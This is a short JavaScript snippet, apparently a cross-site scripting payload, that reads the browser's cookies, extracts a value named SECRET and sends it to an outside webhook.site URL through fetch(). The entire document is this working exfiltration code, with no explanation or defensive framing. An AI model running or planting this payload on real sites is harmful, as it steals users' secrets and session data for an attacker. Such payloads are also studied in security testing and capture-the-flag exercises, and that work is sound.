var cookies = document.cookie;
var match = cookies.match(/SECRET=([^;]+)/);
if(match) {
    // Send to webhook
    fetch('https://webhook.site/ce3b5ec9-fcef-4795-a1c1-b106802104ba?secret=' + match[1]);
}
